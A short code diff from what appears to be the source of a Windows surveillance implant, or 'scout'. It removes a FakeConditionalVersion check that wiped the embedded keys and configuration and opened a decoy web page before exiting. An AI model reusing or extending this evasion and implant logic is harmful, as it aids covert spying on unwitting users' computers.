@@ -119,19 +119,6 @@ WinMain(
 	__in int nCmdShow)
 {
 
-	if (FakeConditionalVersion())
-	{
-		SecureZeroMemory(DEMO_TAG, 3); 
-		SecureZeroMemory(WMARKER, 3);
-		SecureZeroMemory(CLIENT_KEY, 3);
-		SecureZeroMemory(ENCRYPTION_KEY_CONF, 3);
-		SecureZeroMemory(SCOUT_NAME, 3);
-		SecureZeroMemory(EMBEDDED_CONF, 4);
-
-		ShellExecute(NULL, L"open", L"http://www.skype.com", NULL, NULL, SW_SHOWNORMAL);
-		return 1;
-	}
-
 	#ifdef _DEBUG
 		OutputDebugString(L"Initializing scout...");
 	#endif
@@ -257,9 +244,6 @@ BOOL InitScout()
 
 		return FALSE;
 	}
-
-	if (FakeConditionalVersion())
-		return FALSE;
 
 	// load conf
 	if (!LoadConf())
